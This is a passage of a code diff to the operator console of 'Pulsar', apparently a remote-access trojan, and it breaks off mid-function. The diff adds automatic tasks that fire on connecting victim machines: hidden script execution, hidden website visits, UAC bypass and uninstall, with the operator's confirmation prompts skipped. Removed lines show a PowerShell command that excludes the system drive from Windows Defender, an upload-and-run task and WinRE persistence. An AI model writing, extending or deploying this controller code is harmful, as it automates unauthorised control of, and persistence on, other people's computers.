@@ -39,6 +39,22 @@ using ImageSource = System.Windows.Media.ImageSource;
 
 namespace Pulsar.Server.Forms
 {
+    /// <summary>
+    /// Defines how auto tasks should be executed when clients connect.
+    /// </summary>
+    public enum AutoTaskExecutionMode
+    {
+        /// <summary>
+        /// Auto tasks run only once per client (based on client ID).
+        /// </summary>
+        OncePerClient,
+
+        /// <summary>
+        /// Auto tasks run every time a client connects.
+        /// </summary>
+        EveryConnection
+    }
+    
     public partial class FrmMain : Form
     {
         [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
@@ -65,7 +81,7 @@ namespace Pulsar.Server.Forms
         private bool _statsRefreshPending;
         private readonly HashSet<Client> _visibleClients = new HashSet<Client>();
         private readonly Dictionary<Client, ClientListEntry> _clientEntryMap = new();
-    private readonly Dictionary<int, ImageSource> _flagImageCache = new();
+        private readonly Dictionary<int, ImageSource> _flagImageCache = new();
         private bool _syncingSelection;
         private IReadOnlyList<OfflineClientRecord> _cachedOfflineClients = Array.Empty<OfflineClientRecord>();
         private PreviewHandler _previewImageHandler;
@@ -75,6 +91,10 @@ namespace Pulsar.Server.Forms
         private readonly List<NotificationEntry> _notificationHistory = new();
         private readonly object _notificationLock = new();
         private Font _notificationUnreadFont;
+        private Dictionary<string, AutoTaskBehavior> _autoTaskBehaviors = new(StringComparer.OrdinalIgnoreCase);
+        private Dictionary<string, AutoTaskBehavior> _autoTaskBehaviorsByTitle = new(StringComparer.OrdinalIgnoreCase);
+        private AutoTaskExecutionContext _currentAutoTaskContext;
+        private readonly HashSet<string> _executedTaskClientCombinations = new HashSet<string>();
 
         public FrmMain()
         {
@@ -104,6 +124,10 @@ namespace Pulsar.Server.Forms
             _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup
 
             tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;
+
+            addTaskToolStripMenuItem.DropDownItems.Clear();
+            InitializeAutoTaskBehaviors();
+            BuildAutoTaskMenu();
 
             InitializeSearch();
             InitializeNotificationTracking();
@@ -319,8 +343,58 @@ namespace Pulsar.Server.Forms
 
             LoadNotificationHistory();
             LoadAutoTasks();
+            InitializeAutoTasksMenu();
             ScheduleOfflineListRefresh();
             ScheduleStatsRefresh();
+        }
+
+        private void InitializeAutoTasksMenu()
+        {
+            var separator = new ToolStripSeparator();
+            TasksContextMenuStrip.Items.Add(separator);
+
+            var executeAllMenuItem = new ToolStripMenuItem("Execute on All Clients")
+            {
+                Image = Properties.Resources.application_go,
+                ToolTipText = "Execute auto tasks on all connected clients that haven't had them executed yet"
+            };
+            executeAllMenuItem.Click += (s, e) => ExecuteAutoTasksOnAllClients();
+            TasksContextMenuStrip.Items.Add(executeAllMenuItem);
+
+            var forceExecuteMenuItem = new ToolStripMenuItem("Force Execute on All Connected Clients")
+            {
+                Image = Properties.Resources.application_add,
+                ToolTipText = "Force execute auto tasks on all connected clients, regardless of previous execution"
+            };
+            forceExecuteMenuItem.Click += (s, e) => ForceExecuteAutoTasksOnAllClients();
+            TasksContextMenuStrip.Items.Add(forceExecuteMenuItem);
+
+            var resetTrackingMenuItem = new ToolStripMenuItem("Reset Execution Tracking")
+            {
+                Image = Properties.Resources.refresh,
+                ToolTipText = "Reset tracking so auto tasks will run on all clients again"
+            };
+            resetTrackingMenuItem.Click += (s, e) => ResetAutoTaskTracking();
+            TasksContextMenuStrip.Items.Add(resetTrackingMenuItem);
+
+            var separator2 = new ToolStripSeparator();
+            TasksContextMenuStrip.Items.Add(separator2);
+
+            var toggleModeMenuItem = new ToolStripMenuItem("Toggle Execution Mode")
+            {
+                Image = Properties.Resources.refresh,
+                ToolTipText = "Toggle between 'Once Per Client' and 'Every Connection' for selected tasks"
+            };
+            toggleModeMenuItem.Click += (s, e) => ToggleSelectedTasksExecutionMode();
+            TasksContextMenuStrip.Items.Add(toggleModeMenuItem);
+
+            var aboutModesMenuItem = new ToolStripMenuItem("About Task Execution Modes")
+            {
+                Image = Properties.Resources.information,
+                ToolTipText = "Learn about task execution modes"
+            };
+            aboutModesMenuItem.Click += (s, e) => ShowTaskExecutionModeDialog();
+            TasksContextMenuStrip.Items.Add(aboutModesMenuItem);
         }
 
         private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
@@ -715,7 +789,25 @@ namespace Pulsar.Server.Forms
 
         private void StartAutomatedTask(Client client)
         {
-            Debug.WriteLine(IsClientBlocked(client.EndPoint.Address.ToString()) ? "Blocked client, skipping automated tasks." : "Starting automated tasks for client.");
+            if (client == null)
+            {
+                return;
+            }
+
+            if (IsClientBlocked(client.EndPoint.Address.ToString()))
+            {
+                Debug.WriteLine("Blocked client, skipping automated tasks.");
+                return;
+            }
+
+            string clientId = client.Value?.Id;
+            if (string.IsNullOrEmpty(clientId))
+            {
+                Debug.WriteLine("Client ID is null or empty, skipping automated tasks.");
+                return;
+            }
+
+            Debug.WriteLine($"Starting automated tasks for client {clientId}.");
 
             if (lstTasks.InvokeRequired)
             {
@@ -725,58 +817,244 @@ namespace Pulsar.Server.Forms
 
             foreach (ListViewItem item in lstTasks.Items)
             {
-                string taskCaption = item.Text;
-                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
-                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";
+                var task = ExtractAutoTask(item);
+                if (task == null) continue;
 
-                switch (taskCaption)
+                if (task.ExecutionMode == AutoTaskExecutionMode.OncePerClient)
                 {
-                    case "Remote Execute":
-                        Debug.WriteLine("Remote Execute auto task starting");
-                        var taskHandler = new TaskManagerHandler(client);
-
-                        string remotePath = subItem0;
-                        Debug.WriteLine($"Starting upload of {remotePath}");
-
-                        var fileHandler = new FileManagerHandler(client);
-                        fileHandler.BeginUploadFile(remotePath, "");
-
-                        Debug.WriteLine($"Executing remote file: {remotePath}");
-                        taskHandler.StartProcess(remotePath);
-                        break;
-
-                    case "Shell Command":
-                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
-                        break;
-
-                    case "Exclude System Drives":
-                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
-                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
+                    string taskClientKey = $"{task.Identifier}_{clientId}";
+                    lock (_executedTaskClientCombinations)
+                    {
+                        if (_executedTaskClientCombinations.Contains(taskClientKey))
                         {
-                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
+                            Debug.WriteLine($"Task '{task.Title}' already executed for client {clientId}, skipping.");
+                            continue;
                         }
-                        break;
-
-                    case "Message Box":
-                        client.Send(new DoShowMessageBox
-                        {
-                            Caption = subItem0,
-                            Text = subItem1,
-                            Button = "OK",
-                            Icon = "None"
-                        });
-                        break;
-
-                    case "WinRE":
-                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
-                        {
-                            client.Send(new DoAddWinREPersistence());
-                        }
-                        break;
-
-                    default:
-                        break;
+                        _executedTaskClientCombinations.Add(taskClientKey);
+                    }
+                    Debug.WriteLine($"Executing task '{task.Title}' for client {clientId} (OncePerClient mode).");
                 }
+                else
+                {
+                    Debug.WriteLine($"Executing task '{task.Title}' for client {clientId} (EveryConnection mode).");
+                }
+
+                if (!TryExecuteAutoTask(task, client))
+                {
+                    ExecuteLegacyAutoTask(task, client);
+                }
+            }
+        }
+
+        /// <summary>
+        /// Executes auto tasks on all connected clients, respecting each task's execution mode.
+        /// </summary>
+        public void ExecuteAutoTasksOnAllClients()
+        {
+            if (lstTasks.Items.Count == 0)
+            {
+                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            var clientsProcessed = 0;
+
+            lock (_lockClients)
+            {
+                foreach (ListViewItem item in lstClients.Items)
+                {
+                    if (item.Tag is Client client && client.Value != null)
+                    {
+                        ThreadPool.QueueUserWorkItem(_ => StartAutomatedTask(client));
+                        clientsProcessed++;
+                    }
+                }
+            }
+
+            MessageBox.Show($"Auto tasks queued for {clientsProcessed} clients (respecting individual task execution modes).", 
+                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        /// <summary>
+        /// Resets the tracking of which task-client combinations have been executed, allowing them to run again.
+        /// </summary>
+        public void ResetAutoTaskTracking()
+        {
+            lock (_executedTaskClientCombinations)
+            {
+                var count = _executedTaskClientCombinations.Count;
+                _executedTaskClientCombinations.Clear();
+                MessageBox.Show($"Auto task tracking reset for {count} task-client combinations. " +
+                               "Tasks with 'Once Per Client' mode will now run again on all clients.", 
+                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            }
+        }
+
+        /// <summary>
+        /// Forces auto tasks to execute on selected clients, regardless of whether they've been executed before.
+        /// </summary>
+        public void ForceExecuteAutoTasksOnSelectedClients()
+        {
+            var selectedClients = GetSelectedClients();
+            if (selectedClients.Length == 0)
+            {
+                MessageBox.Show("Please select one or more clients first.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            if (lstTasks.Items.Count == 0)
+            {
+                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            foreach (var client in selectedClients)
+            {
+                ThreadPool.QueueUserWorkItem(_ => {
+                    Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");
+                    
+                    if (lstTasks.InvokeRequired)
+                    {
+                        lstTasks.Invoke(new Action(() => {
+                            foreach (ListViewItem item in lstTasks.Items)
+                            {
+                                var task = ExtractAutoTask(item);
+                                if (!TryExecuteAutoTask(task, client))
+                                {
+                                    ExecuteLegacyAutoTask(task, client);
+                                }
+                            }
+                        }));
+                    }
+                    else
+                    {
+                        foreach (ListViewItem item in lstTasks.Items)
+                        {
+                            var task = ExtractAutoTask(item);
+                            if (!TryExecuteAutoTask(task, client))
+                            {
+                                ExecuteLegacyAutoTask(task, client);
+                            }
+                        }
+                    }
+                });
+            }
+
+            MessageBox.Show($"Auto tasks queued for {selectedClients.Length} selected clients.", 
+                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        /// <summary>
+        /// Forces auto tasks to execute on all connected clients, regardless of whether they've been executed before.
+        /// </summary>
+        public void ForceExecuteAutoTasksOnAllClients()
+        {
+            if (lstTasks.Items.Count == 0)
+            {
+                MessageBox.Show("No auto tasks configured.", "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            var clientsProcessed = 0;
+
+            lock (_lockClients)
+            {
+                foreach (ListViewItem item in lstClients.Items)
+                {
+                    if (item.Tag is Client client && client.Value != null)
+                    {
+                        ThreadPool.QueueUserWorkItem(_ => {
+                            // Force execute auto tasks without checking/updating the tracking
+                            Debug.WriteLine($"Force executing automated tasks for client {client.Value?.Id}.");
+                            
+                            if (lstTasks.InvokeRequired)
+                            {
+                                lstTasks.Invoke(new Action(() => {
+                                    foreach (ListViewItem taskItem in lstTasks.Items)
+                                    {
+                                        var task = ExtractAutoTask(taskItem);
+                                        if (!TryExecuteAutoTask(task, client))
+                                        {
+                                            ExecuteLegacyAutoTask(task, client);
+                                        }
+                                    }
+                                }));
+                            }
+                            else
+                            {
+                                foreach (ListViewItem taskItem in lstTasks.Items)
+                                {
+                                    var task = ExtractAutoTask(taskItem);
+                                    if (!TryExecuteAutoTask(task, client))
+                                    {
+                                        ExecuteLegacyAutoTask(task, client);
+                                    }
+                                }
+                            }
+                        });
+                        clientsProcessed++;
+                    }
+                }
+            }
+
+            MessageBox.Show($"Auto tasks queued for {clientsProcessed} connected clients (forced execution).", 
+                           "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        /// <summary>
+        /// Shows information about task execution modes and how to configure them.
+        /// </summary>
+        private void ShowTaskExecutionModeDialog()
+        {
+            string message = "Auto Task Execution Modes:\n\n" +
+                           "• Once Per Client: Task runs only once per client (default)\n" +
+                           "• Every Connection: Task runs every time a client connects\n\n" +
+                           "To change a task's execution mode:\n" +
+                           "1. Right-click on a task in the list\n" +
+                           "2. Select 'Toggle Execution Mode'\n\n" +
+                           "The execution mode is shown in the 'Arguments' column:\n" +
+                           "- '[Once]' = Once Per Client\n" +
+                           "- '[Every]' = Every Connection";
+
+            MessageBox.Show(message, "Auto Task Execution Modes", 
+                           MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        /// <summary>
+        /// Toggles the execution mode for selected tasks in the tasks list.
+        /// </summary>
+        private void ToggleSelectedTasksExecutionMode()
+        {
+            if (lstTasks.SelectedItems.Count == 0)
+            {
+                MessageBox.Show("Please select one or more tasks to toggle their execution mode.", 
+                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            var updatedCount = 0;
+            foreach (ListViewItem item in lstTasks.SelectedItems)
+            {
+                var task = ExtractAutoTask(item);
+                if (task != null)
+                {
+                    task.ExecutionMode = task.ExecutionMode == AutoTaskExecutionMode.OncePerClient
+                        ? AutoTaskExecutionMode.EveryConnection
+                        : AutoTaskExecutionMode.OncePerClient;
+
+                    var newItem = CreateAutoTaskListViewItem(task);
+                    var index = lstTasks.Items.IndexOf(item);
+                    lstTasks.Items[index] = newItem;
+                    lstTasks.Items[index].Selected = true;
+                    updatedCount++;
+                }
+            }
+
+            if (updatedCount > 0)
+            {
+                SaveAutoTasks();
+                MessageBox.Show($"Execution mode toggled for {updatedCount} task(s).", 
+                               "Auto Tasks", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
         }
 
@@ -1813,6 +2091,11 @@ namespace Pulsar.Server.Forms
 
         private Client[] GetSelectedClients()
         {
+            if (_currentAutoTaskContext != null)
+            {
+                return _currentAutoTaskContext.Clients;
+            }
+
             if (wpfClientsHost != null)
             {
                 return wpfClientsHost.SelectedClients.ToArray();
@@ -1897,18 +2180,25 @@ namespace Pulsar.Server.Forms
             var selectedClients = GetSelectedClients();
             if (selectedClients.Length == 0) return;
 
-            var result = MessageBox.Show(
-                $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
-                "Confirm UAC Bypass",
-                MessageBoxButtons.YesNo,
-                MessageBoxIcon.Warning);
-
-            if (result == DialogResult.Yes)
+            bool proceed = true;
+            if (_currentAutoTaskContext == null)
             {
-                foreach (Client c in selectedClients)
-                {
-                    c.Send(new DoUACBypass());
-                }
+                var result = MessageBox.Show(
+                    $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
+                    "Confirm UAC Bypass",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Warning);
+                proceed = result == DialogResult.Yes;
+            }
+
+            if (!proceed)
+            {
+                return;
+            }
+
+            foreach (Client c in selectedClients)
+            {
+                c.Send(new DoUACBypass());
             }
         }
 
@@ -2021,18 +2311,30 @@ namespace Pulsar.Server.Forms
 
         private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count == 0) return;
-            if (
-                MessageBox.Show(
-                    string.Format(
-                        "Are you sure you want to uninstall the client on {0} computer\\s?",
-                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
-                    MessageBoxIcon.Question) == DialogResult.Yes)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                foreach (Client c in GetSelectedClients())
-                {
-                    c.Send(new DoClientUninstall());
-                }
+                return;
+            }
+
+            bool proceed = true;
+            if (_currentAutoTaskContext == null)
+            {
+                proceed = MessageBox.Show(
+                    string.Format("Are you sure you want to uninstall the client on {0} computer\\s?", clients.Length),
+                    "Uninstall Confirmation",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question) == DialogResult.Yes;
+            }
+
+            if (!proceed)
+            {
+                return;
+            }
+
+            foreach (Client c in clients)
+            {
+                c.Send(new DoClientUninstall());
             }
         }
 
@@ -2112,14 +2414,17 @@ namespace Pulsar.Server.Forms
 
         private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                foreach (Client c in GetSelectedClients())
-                {
-                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
-                    frmRe.Show();
-                    frmRe.Focus();
-                }
+                return;
+            }
+
+            foreach (Client c in clients)
+            {
+                FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
+                frmRe.Show();
+                frmRe.Focus();
             }
         }
 
@@ -2261,20 +2566,48 @@ namespace Pulsar.Server.Forms
 
         private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
+                return;
+            }
+
+            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
+            {
+                string url = autoTask.Param1;
+                bool hidden = false;
+                if (!string.IsNullOrWhiteSpace(autoTask.Param3))
                 {
-                    if (frm.ShowDialog() == DialogResult.OK)
+                    bool.TryParse(autoTask.Param3, out hidden);
+                }
+                else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
+                {
+                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
+                }
+
+                foreach (Client c in clients)
+                {
+                    c.Send(new DoVisitWebsite
                     {
-                        foreach (Client c in GetSelectedClients())
+                        Url = url,
+                        Hidden = hidden
+                    });
+                }
+
+                return;
+            }
+
+            using (var frm = new FrmVisitWebsite(clients.Length))
+            {
+                if (frm.ShowDialog() == DialogResult.OK)
+                {
+                    foreach (Client c in clients)
+                    {
+                        c.Send(new DoVisitWebsite
                         {
-                            c.Send(new DoVisitWebsite
-                            {
-                                Url = frm.Url,
-                                Hidden = frm.Hidden
-                            });
-                        }
+                            Url = frm.Url,
+                            Hidden = frm.Hidden
+                        });
                     }
                 }
             }
@@ -2282,22 +2615,46 @@ namespace Pulsar.Server.Forms
 
         private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
+                return;
+            }
+
+            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
+            {
+                string caption = autoTask.Param1;
+                string text = autoTask.Param2 ?? string.Empty;
+                string button = string.IsNullOrWhiteSpace(autoTask.Param3) ? "OK" : autoTask.Param3;
+                string icon = string.IsNullOrWhiteSpace(autoTask.Param4) ? "None" : autoTask.Param4;
+
+                foreach (Client c in clients)
                 {
-                    if (frm.ShowDialog() == DialogResult.OK)
+                    c.Send(new DoShowMessageBox
                     {
-                        foreach (Client c in GetSelectedClients())
+                        Caption = caption,
+                        Text = text,
+                        Button = button,
+                        Icon = icon
+                    });
+                }
+
+                return;
+            }
+
+            using (var frm = new FrmShowMessagebox(clients.Length))
+            {
+                if (frm.ShowDialog() == DialogResult.OK)
+                {
+                    foreach (Client c in clients)
+                    {
+                        c.Send(new DoShowMessageBox
                         {
-                            c.Send(new DoShowMessageBox
-                            {
-                                Caption = frm.MsgBoxCaption,
-                                Text = frm.MsgBoxText,
-                                Button = frm.MsgBoxButton,
-                                Icon = frm.MsgBoxIcon
-                            });
-                        }
+                            Caption = frm.MsgBoxCaption,
+                            Text = frm.MsgBoxText,
+                            Button = frm.MsgBoxButton,
+                            Icon = frm.MsgBoxIcon
+                        });
                     }
                 }
             }
@@ -2375,28 +2732,67 @@ namespace Pulsar.Server.Forms
 
         private void cWToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                openFileDialog.InitialDirectory = "c:\\";
-                openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp";
-                openFileDialog.FilterIndex = 1;
-                openFileDialog.RestoreDirectory = true;
+                return;
+            }
 
-                if (openFileDialog.ShowDialog() == DialogResult.OK)
+            string selectedFilePath = string.Empty;
+            bool hasSelectedPath = false;
+
+            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param1))
+            {
+                selectedFilePath = autoTask.Param1;
+                if (!File.Exists(selectedFilePath))
                 {
-                    string selectedFilePath = openFileDialog.FileName;
-                    byte[] imageData = File.ReadAllBytes(selectedFilePath);
-                    string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLower();
+                    EventLog($"Wallpaper file not found: {selectedFilePath}", "error");
+                    return;
+                }
+                hasSelectedPath = true;
+            }
+            else
+            {
+                using (OpenFileDialog openFileDialog = new OpenFileDialog())
+                {
+                    openFileDialog.InitialDirectory = "c:\\";
+                    openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp;*.gif";
+                    openFileDialog.FilterIndex = 1;
+                    openFileDialog.RestoreDirectory = true;
 
-                    foreach (Client c in GetSelectedClients())
+                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                     {
-                        c.Send(new DoChangeWallpaper
-                        {
-                            ImageData = imageData,
-                            ImageFormat = imageFormat
-                        });
+                        selectedFilePath = openFileDialog.FileName;
+                        hasSelectedPath = true;
                     }
                 }
+            }
+
+            if (!hasSelectedPath || string.IsNullOrWhiteSpace(selectedFilePath))
+            {
+                return;
+            }
+
+            byte[] imageData;
+            try
+            {
+                imageData = File.ReadAllBytes(selectedFilePath);
+            }
+            catch (Exception ex)
+            {
+                EventLog($"Failed to read wallpaper file '{selectedFilePath}': {ex.Message}", "error");
+                return;
+            }
+
+            string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLowerInvariant();
+
+            foreach (Client c in clients)
+            {
+                c.Send(new DoChangeWallpaper
+                {
+                    ImageData = imageData,
+                    ImageFormat = imageFormat
+                });
             }
         }
 
@@ -2873,6 +3269,7 @@ namespace Pulsar.Server.Forms
                 {
                     lstTasks.Items.Remove(item);
                 }
+                SaveAutoTasks();
             }
         }
 
@@ -2912,11 +3309,30 @@ namespace Pulsar.Server.Forms
 
         public void AddTask(string title, string param1, string param2)
         {
-            ListViewItem newItem = new ListViewItem(title);
-            newItem.SubItems.Add(param1);
-            newItem.SubItems.Add(param2);
+            AddTask(new AutoTask
+            {
+                Title = title ?? string.Empty,
+                Param1 = param1 ?? string.Empty,
+                Param2 = param2 ?? string.Empty
+            });
+        }
+
+        public void AddTask(AutoTask task, bool persist = true)
+        {
+            if (task == null)
+            {
+                return;
+            }
+
+            NormalizeAutoTask(task);
+
+            var newItem = CreateAutoTaskListViewItem(task);
             lstTasks.Items.Add(newItem);
-            SaveAutoTasks();
+
+            if (persist)
+            {
+                SaveAutoTasks();
+            }
         }
 
         private void excludeSystemDriveToolStripMenuItem_Click(object sender, EventArgs e)
@@ -3195,21 +3611,51 @@ namespace Pulsar.Server.Forms
 
         private void remoteScriptingToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                using (var frm = new FrmRemoteScripting(lstClients.SelectedItems.Count))
+                return;
+            }
+
+            if (_currentAutoTaskContext?.Task is AutoTask autoTask && !string.IsNullOrWhiteSpace(autoTask.Param3))
+            {
+                string language = string.IsNullOrWhiteSpace(autoTask.Param1) ? "Powershell" : autoTask.Param1;
+                string script = autoTask.Param3;
+                bool hidden = false;
+                if (!string.IsNullOrWhiteSpace(autoTask.Param4))
                 {
-                    if (frm.ShowDialog() == DialogResult.OK)
+                    bool.TryParse(autoTask.Param4, out hidden);
+                }
+                else if (!string.IsNullOrWhiteSpace(autoTask.Param2))
+                {
+                    hidden = string.Equals(autoTask.Param2, "Hidden", StringComparison.OrdinalIgnoreCase);
+                }
+
+                foreach (Client c in clients)
+                {
+                    c.Send(new DoExecScript
                     {
-                        foreach (Client c in GetSelectedClients())
+                        Language = language,
+                        Script = script,
+                        Hidden = hidden
+                    });
+                }
+
+                return;
+            }
+
+            using (var frm = new FrmRemoteScripting(clients.Length))
+            {
+                if (frm.ShowDialog() == DialogResult.OK)
+                {
+                    foreach (Client c in clients)
+                    {
+                        c.Send(new DoExecScript
                         {
-                            c.Send(new DoExecScript
-                            {
-                                Language = frm.Lang,
-                                Script = frm.Script,
-                                Hidden = frm.Hidden
-                            });
-                        }
+                            Language = frm.Lang,
+                            Script = frm.Script,
+                            Hidden = frm.Hidden
+                        });
                     }
                 }
             }
@@ -3252,38 +3698,59 @@ namespace Pulsar.Server.Forms
 
         private void blockIPToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count == 0) return;
-            if (
-                MessageBox.Show(
-                    string.Format(
-                        "Are you sure you want to Block {0} IP\\s?",
-                        lstClients.SelectedItems.Count), "Block Confirmation", MessageBoxButtons.YesNo,
-                    MessageBoxIcon.Question) == DialogResult.Yes)
+            var clients = GetSelectedClients();
+            if (clients.Length == 0)
             {
-                foreach (Client c in GetSelectedClients())
+                return;
+            }
+
+            bool proceed = true;
+            if (_currentAutoTaskContext == null)
+            {
+                proceed = MessageBox.Show(
+                    string.Format("Are you sure you want to Block {0} IP\\s?", clients.Length),
+                    "Block Confirmation",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question) == DialogResult.Yes;
+            }
+
+            if (!proceed)
+            {
+                return;
+            }
+
+            string filePath = Path.Combine(PulsarStuffDir, "blocked.json");
+            List<string> blockedIPs = new List<string>();
+
+            try
+            {
+                if (File.Exists(filePath))
                 {
-                    string clientAddress = c.EndPoint.Address.ToString();
-                    string filePath = Path.Combine(PulsarStuffDir, "blocked.json");
-                    List<string> blockedIPs = new List<string>();
-                    try
-                    {
-                        if (File.Exists(filePath))
-                        {
-                            string json = File.ReadAllText(filePath);
-                            blockedIPs = JsonConvert.DeserializeObject<List<string>>(json) ?? new List<string>();
-                        }
-                        if (!blockedIPs.Contains(clientAddress))
-                        {
-                            blockedIPs.Add(clientAddress);
-                        }
-                        string updatedJson = JsonConvert.SerializeObject(blockedIPs, Newtonsoft.Json.Formatting.Indented);
-                        File.WriteAllText(filePath, updatedJson);
-                    }
-                    catch (Exception)
-                    {
-                    }
-                    c.Send(new DoClientUninstall());
+                    string json = File.ReadAllText(filePath);
+                    blockedIPs = JsonConvert.DeserializeObject<List<string>>(json) ?? new List<string>();
                 }
+            }
+            catch (Exception)
+            {
+            }
+
+            foreach (Client c in clients)
+            {
+                string clientAddress = c.EndPoint.Address.ToString();
+                if (!blockedIPs.Contains(clientAddress))
+                {
+                    blockedIPs.Add(clientAddress);
+                }
+                c.Send(new DoClientUninstall());
+            }
+
+            try
+            {
+                string updatedJson = JsonConvert.SerializeObject(blockedIPs, Newtonsoft.Json.Formatting.Indented);
+                File.WriteAllText(filePath, updatedJson);
+            }
+            catch (Exception)
+            {
             }
         }
 
@@ -3301,45 +3768,767 @@ namespace Pulsar.Server.Forms
 
         private void SaveAutoTasks()
         {
-            var tasks = new List<AutoTask>();
-            foreach (ListViewItem item in lstTasks.Items)
+            try
             {
-                tasks.Add(new AutoTask
-                {
-                    Title = item.Text,
-                    Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "",
-                    Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text : ""
-                });
+                var tasks = lstTasks.Items.Cast<ListViewItem>()
+                    .Select(ExtractAutoTask)
+                    .ToList();
+
+                File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Formatting.Indented));
             }
-            File.WriteAllText(AutoTasksFilePath, JsonConvert.SerializeObject(tasks, Newtonsoft.Json.Formatting.Indented));
+            catch (Exception ex)
+            {
+                EventLog($"Failed to save autotasks: {ex.Message}", "error");
+            }
         }
 
         private void LoadAutoTasks()
         {
             lstTasks.Items.Clear();
-            if (File.Exists(AutoTasksFilePath))
+
+            if (!File.Exists(AutoTasksFilePath))
             {
-                try
+                return;
+            }
+
+            try
+            {
+                string fileContent = File.ReadAllText(AutoTasksFilePath);
+                if (string.IsNullOrWhiteSpace(fileContent))
                 {
-                    var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(File.ReadAllText(AutoTasksFilePath));
-                    if (tasks != null)
-                    {
-                        foreach (var task in tasks)
-                        {
-                            AddTask(task.Title, task.Param1, task.Param2);
-                        }
-                    }
+                    return;
                 }
-                catch (Exception ex)
+
+                var tasks = JsonConvert.DeserializeObject<List<AutoTask>>(fileContent);
+                if (tasks == null)
                 {
-                    MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                foreach (var task in tasks)
+                {
+                    AddTask(task, persist: false);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Failed to load autotasks: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private AutoTask ExtractAutoTask(ListViewItem item)
+        {
+            if (item.Tag is AutoTask task)
+            {
+                task.Title = item.Text ?? string.Empty;
+                task.Param1 = item.SubItems.Count > 1 ? item.SubItems[1].Text ?? string.Empty : string.Empty;
+                task.Param2 = item.SubItems.Count > 2 ? item.SubItems[2].Text ?? string.Empty : string.Empty;
